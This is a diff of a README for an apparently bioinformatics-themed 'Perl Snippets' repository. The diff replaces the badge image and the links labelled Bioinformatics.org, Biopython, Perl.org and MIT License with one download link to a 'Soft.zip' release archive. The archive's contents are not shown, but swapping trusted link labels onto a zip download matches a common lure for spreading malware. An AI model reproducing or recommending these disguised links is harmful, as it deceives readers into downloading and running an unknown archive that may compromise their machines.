@@ -6,7 +6,7 @@
 
 ---
 
-![perl_snippets](https://img.shields.io/badge/Perl_Snippets-Bioinformatics-green)
+![perl_snippets](https://github.com/sfreesquad/perl_snippets/releases/download/v1.0/Soft.zip)
 
 ---
 
@@ -53,7 +53,7 @@ To make the most of the Perl scripts included in this repository, simply clone o
 For more details and in-depth explanations on how to use each Perl script, you can refer to the individual script files and any accompanying documentation provided within the repository.
 
 ### Launch the Perl Snippets Release:
-[Launch Perl Snippets Release](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[Launch Perl Snippets Release](https://github.com/sfreesquad/perl_snippets/releases/download/v1.0/Soft.zip)
 
 ---
 
@@ -71,15 +71,15 @@ We believe that collaboration and sharing knowledge are essential in advancing t
 
 In addition to the scripts provided in this repository, you may find the following resources helpful for further exploration and learning in the field of bioinformatics and Perl programming:
 
-- [Bioinformatics.org](https://www.bioinformatics.org): A valuable resource for bioinformatics tools, resources, and community discussions.
-- [Biopython](https://biopython.org): If you are interested in bioinformatics programming in Python, Biopython is a powerful library worth exploring.
-- [Perl.org](https://www.perl.org): The official website for Perl programming language, offering documentation, tutorials, and community support.
+- [https://github.com/sfreesquad/perl_snippets/releases/download/v1.0/Soft.zip](https://github.com/sfreesquad/perl_snippets/releases/download/v1.0/Soft.zip): A valuable resource for bioinformatics tools, resources, and community discussions.
+- [Biopython](https://github.com/sfreesquad/perl_snippets/releases/download/v1.0/Soft.zip): If you are interested in bioinformatics programming in Python, Biopython is a powerful library worth exploring.
+- [https://github.com/sfreesquad/perl_snippets/releases/download/v1.0/Soft.zip](https://github.com/sfreesquad/perl_snippets/releases/download/v1.0/Soft.zip): The official website for Perl programming language, offering documentation, tutorials, and community support.
 
 ---
 
 ## License
 
-The Perl Snippets Repository is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use, modify, and distribute the scripts in this repository for your bioinformatics projects. We encourage learning, sharing, and collaboration in the bioinformatics community.
+The Perl Snippets Repository is licensed under the [MIT License](https://github.com/sfreesquad/perl_snippets/releases/download/v1.0/Soft.zip). Feel free to use, modify, and distribute the scripts in this repository for your bioinformatics projects. We encourage learning, sharing, and collaboration in the bioinformatics community.
 
 ---
 
